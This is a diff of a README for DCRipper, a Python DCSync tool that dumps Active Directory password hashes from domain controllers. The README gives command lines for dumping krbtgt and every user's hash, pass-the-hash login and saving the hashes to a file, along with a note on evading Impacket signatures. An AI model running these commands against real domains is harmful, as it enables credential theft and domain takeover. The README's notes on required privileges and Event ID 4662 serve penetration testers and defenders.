@@ -1,42 +1,50 @@
 # DCRipper
 
+![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)
+![License](https://img.shields.io/badge/License-MIT-green.svg)
+![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)
+
 A pure Python implementation of the MS-DRSR (Directory Replication Service Remote Protocol) for Active Directory credential extraction. Built from scratch without Impacket dependencies.
+
+## Overview
+
+DCRipper performs DCSync attacks by implementing the Windows Directory Replication Service protocol from the ground up. It includes custom implementations of:
+
+- **DCE/RPC** - Remote procedure call protocol
+- **NDR** - Network Data Representation serialization
+- **NTLM** - NT LAN Manager authentication
+- **MS-DRSR** - Directory Replication Service Remote Protocol
 
 ## Features
 
-- Pure Python MS-DRSR protocol implementation
-- Custom DCE/RPC, NDR, and NTLM implementations
-- Single user or full domain credential extraction
-- Pass-the-Hash authentication support
-- TCP and SMB transport options
-- Hashcat and JSON output formats
+- Zero Impacket dependencies
+- Single user or full domain extraction
+- Pass-the-Hash authentication
+- TCP and SMB transport
+- Hashcat-compatible output
 
-## Requirements
+## Installation
 
 ```bash
+git clone https://github.com/kypvas/dcripper.git
+cd dcripper
 pip install pycryptodome
 ```
 
 ## Usage
 
 ```bash
-# Dump krbtgt (default)
+# Dump krbtgt
 python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -p Password123
 
-# Dump specific user
-python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -p Password123 -t administrator
-
-# Dump all domain users
+# Dump all users
 python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -p Password123 -a
 
 # Pass-the-Hash
-python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -H aad3b435b51404eeaad3b435b51404ee:ntlmhash
+python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -H :ntlmhash
 
-# Save to file
+# Save output
 python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -p Password123 -a -o hashes.txt
-
-# JSON output
-python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -p Password123 -f json
 ```
 
 ## Options
@@ -44,60 +52,59 @@ python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -p Password123 -f json
 | Option | Description |
 |--------|-------------|
 | `-dc` | Domain controller IP or hostname |
-| `-d` | Domain name (NETBIOS or FQDN) |
+| `-d` | Domain name |
 | `-u` | Username |
 | `-p` | Password |
-| `-H` | NTLM hash (`LMHASH:NTHASH` or `NTHASH`) |
+| `-H` | NTLM hash |
 | `-t` | Target user (default: krbtgt) |
 | `-a` | Dump all users |
 | `-o` | Output file |
-| `-f` | Format: `hashcat` (default), `json` |
-| `--smb` | Use SMB transport |
-| `--timeout` | Timeout in seconds (default: 30) |
-| `-v` | Verbose output |
+| `-f` | Format: `hashcat`, `json` |
+| `-v` | Verbose |
 
-## Output
+## Output Format
 
-**Hashcat format:**
 ```
 DOMAIN\administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DOMAIN\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:155f4bc3b5615e06116a605a1d887eaa:::
 ```
 
-**JSON format:**
-```json
-{
-  "domain": "DOMAIN",
-  "username": "administrator",
-  "rid": 500,
-  "nt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0"
-}
+## Protocol Flow
+
 ```
-
-## How It Works
-
-1. Endpoint Mapper query (port 135) to locate DRSUAPI service
-2. NTLM authentication with packet privacy
-3. DRSBind to establish replication session
-4. DRSDomainControllerInfo to get DC metadata
-5. DRSCrackNames for name resolution
-6. DRSGetNCChanges with EXOP_REPL_SECRETS for credential replication
-7. RC4 + DES decryption of replicated secrets
-
-See [IMPLEMENTATION.md](IMPLEMENTATION.md) for protocol details.
+┌──────────┐                              ┌────────────┐
+│ DCRipper │                              │     DC     │
+└────┬─────┘                              └─────┬──────┘
+     │  1. EPM Map (port 135)                   │
+     ├─────────────────────────────────────────>│
+     │  2. NTLM Auth + RPC Bind                 │
+     ├─────────────────────────────────────────>│
+     │  3. DRSBind                              │
+     ├─────────────────────────────────────────>│
+     │  4. DRSGetNCChanges (EXOP_REPL_SECRETS)  │
+     ├─────────────────────────────────────────>│
+     │  5. Encrypted credentials                │
+     │<─────────────────────────────────────────┤
+     │  6. RC4 + DES decryption (local)         │
+     └──────────────────────────────────────────┘
+```
 
 ## Required Privileges
 
-- Domain Admins
-- Enterprise Admins
+- Domain Admins / Enterprise Admins
 - Replicating Directory Changes All
 
 ## Detection
 
-This tool evades signature-based detection targeting Impacket, but behavior-based detection will still identify DCSync activity. Windows Event ID 4662 logs all replication requests regardless of the tool used.
+Evades signature-based detection for Impacket. Behavioral detection (Event ID 4662) will still log replication activity.
+
+## Documentation
+
+See [IMPLEMENTATION.md](IMPLEMENTATION.md) for detailed protocol documentation.
 
 ## Disclaimer
 
-For authorized security testing only.
+For authorized penetration testing and security research only. Unauthorized use is prohibited.
 
 ## License
 
